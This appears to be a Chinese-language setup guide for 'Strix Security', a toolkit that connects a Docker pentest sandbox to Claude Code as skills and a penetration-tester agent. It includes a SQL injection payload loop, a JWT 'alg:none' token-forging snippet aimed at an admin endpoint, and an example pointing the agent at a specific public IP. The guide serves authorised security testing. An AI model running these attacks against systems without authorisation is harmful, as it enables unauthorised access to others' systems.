# Strix Security - 本地集成指南

## 快速开始

### 1. 启动 strix-sandbox MCP Server

```bash
cd /Users/hxt/strix/strix-sandbox-mcp
docker compose up -d

# 验证健康状态
curl http://localhost:9999/health
```

### 2. 配置 Claude Code MCP

在 `~/.claude/settings.json` 中添加:

```json
{
  "mcpServers": {
    "strix-sandbox": {
      "command": "uvx",
      "args": ["--from", "strix-sandbox", "strix-sandbox-mcp"],
      "env": {
        "SANDBOX_URL": "http://localhost:9999"
      }
    }
  }
}
```

或者使用 HTTP 模式 (推荐):

```json
{
  "mcpServers": {
    "strix-sandbox": {
      "url": "http://localhost:9999/mcp",
      "transport": "sse"
    }
  }
}
```

### 3. 安装 Skills 插件

```bash
# 创建符号链接到 Claude Code 插件目录
mkdir -p ~/.claude/plugins
ln -s /Users/hxt/strix/strix-security ~/.claude/plugins/strix-security
```

或将 strix-security 添加到项目的 `.claude/plugins/` 目录。

---

## 使用方式

### 方式 1: 使用 Slash 命令

```
/security-test http://example.com
```

### 方式 2: 自然语言调用 Skills

```
使用 auth-testing skill 测试这个网站的 JWT 认证: http://example.com
```

```
使用 injection-testing skill 测试 SQL 注入漏洞
```

### 方式 3: 使用 @agent 模式 (推荐)

通过 Task tool 调用 penetration-tester agent:

```
@task penetration-tester: 对 http://148.135.56.115 进行全面安全测试
```

---

## 架构说明

```
┌─────────────────────────────────────────────────────────────┐
│                      Claude Code                             │
├─────────────────────────────────────────────────────────────┤
│  Layer 1: Skills (知识层)                                    │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐       │
│  │auth-test │ │injection │ │logic-test│ │reporting │       │
│  │JWT, IDOR │ │SQLi, XSS │ │Race Cond │ │CVSS Score│       │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘       │
├─────────────────────────────────────────────────────────────┤
│  Layer 2: MCP Tools (执行层)                                 │
│  ┌─────────────────────────────────────────────────────────┐│
│  │ sandbox_create    browser_goto       proxy_send_request ││
│  │ browser_click     browser_fill       proxy_list_requests││
│  │ python_execute    terminal_execute   finding_create     ││
│  │ finding_list      finding_export     sandbox_destroy    ││
│  └─────────────────────────────────────────────────────────┘│
├─────────────────────────────────────────────────────────────┤
│  Layer 3: Sandbox Runtime (隔离层)                           │
│  ┌─────────────────────────────────────────────────────────┐│
│  │           Docker Container (strix-sandbox)               ││
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐   ││
│  │  │Playwright│ │mitmproxy │ │ Python   │ │ Terminal │   ││
│  │  │ Browser  │ │  Proxy   │ │ Runtime  │ │  Shell   │   ││
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘   ││
│  └─────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────┘
```

---

## 典型工作流

### 1. 完整安全测试流程

```python
# Step 1: 创建沙箱环境
sandbox = sandbox_create(
    name="security-test",
    with_proxy=True,
    with_browser=True
)

# Step 2: 侦察阶段
browser_goto(url="http://target.com")
requests = proxy_list_requests()
sitemap = proxy_get_sitemap()

# Step 3: 漏洞测试
# 使用 injection-testing skill 中的知识
for payload in sqli_payloads:
    response = proxy_send_request(
        method="GET",
        url=f"http://target.com/search?q={payload}"
    )
    # 分析响应...

# Step 4: 记录发现
finding_create(
    title="SQL Injection",
    severity="CRITICAL",
    endpoint="/search",
    evidence="...",
    poc="curl '...'",
    remediation="使用参数化查询"
)

# Step 5: 生成报告
report = finding_export(format="markdown")

# Step 6: 清理
sandbox_destroy(sandbox_id=sandbox.id)
```

### 2. 快速 JWT 测试

```python
# 使用 auth-testing/JWT_AUTH.md 中的知识
import base64
import json

# 解码现有 token
token = "eyJ..."
header, payload, sig = token.split(".")
header_data = json.loads(base64.b64decode(header + "=="))

# 测试 alg:none 攻击
header_data["alg"] = "none"
new_header = base64.b64encode(json.dumps(header_data).encode()).decode().rstrip("=")
forged_token = f"{new_header}.{payload}."

# 发送测试请求
response = proxy_send_request(
    method="GET",
    url="http://target.com/api/admin",
    headers={"Authorization": f"Bearer {forged_token}"}
)
```

---

## Skills 与 MCP 工具对应表

| Skill | 主要 MCP 工具 | 用途 |
|-------|-------------|------|
| security-recon | browser_goto, proxy_list_requests, proxy_get_sitemap | 侦察和映射 |
| auth-testing | proxy_send_request, python_execute | 认证测试 |
| injection-testing | proxy_send_request, browser_fill | 注入测试 |
| logic-testing | python_execute (并发), proxy_repeat_request | 逻辑测试 |
| platform-testing | browser_execute_js, proxy_send_request | 平台特定测试 |
| security-reporting | finding_create, finding_list, finding_export | 报告生成 |

---

## 配置检查清单

- [ ] Docker Desktop 运行中
- [ ] strix-sandbox 容器健康 (`curl http://localhost:9999/health`)
- [ ] MCP server 配置正确 (`~/.claude/settings.json`)
- [ ] Skills 插件已链接 (`~/.claude/plugins/strix-security`)
- [ ] 目标系统已获得测试授权

---

## 故障排除

### MCP 连接失败

```bash
# 检查容器状态
docker ps | grep strix-sandbox

# 检查日志
docker logs strix-sandbox

# 重启容器
docker compose down && docker compose up -d
```

### Skills 未加载

```bash
# 验证插件目录
ls -la ~/.claude/plugins/

# 检查 plugin.json 格式
cat ~/.claude/plugins/strix-security/.claude-plugin/plugin.json | python -m json.tool
```

### 工具调用超时

```bash
# 增加超时设置
export SANDBOX_TIMEOUT=120000
```
